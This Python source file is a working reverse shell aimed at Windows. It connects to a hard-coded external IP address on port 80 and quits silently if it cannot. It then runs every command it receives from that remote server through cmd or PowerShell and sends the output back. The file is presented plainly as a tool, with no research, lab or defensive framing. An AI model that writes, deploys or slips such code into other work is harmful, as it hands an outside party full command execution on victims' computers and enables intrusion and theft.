import socket
import subprocess
import sys
import os

# with open('ip_port.txt', 'r') as file:
#     # Read the first line
#     first_line = file.readline().strip()

#     # Read the second line
#     second_line = file.readline().strip()

serverIp = "146.190.102.194"#first_line
serverPort = 80#int(second_line)

#creat an IPv4 TCP socket 
serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#bind the docket tot a public host, and well-known port
try:
    serversocket.connect((serverIp, serverPort))
except:
    sys.exit()

while True:
        
    shell_command = serversocket.recv(1024).decode()
    # result = os.system(f"cmd /k {shell_command}")
    # serversocket.send(bytes(result, 'utf-8'))

    try:
        if shell_command[:2] == "ex":
            result = subprocess.Popen(['cmd', '/c', shell_command[3:]], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        else:
            result = subprocess.run(("powershell " + shell_command + ""), shell=True, check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=1)
        result = result.stdout or "Executed"
            
    except:
        result = "error"

    serversocket.send(str(result).encode("utf-8"))



    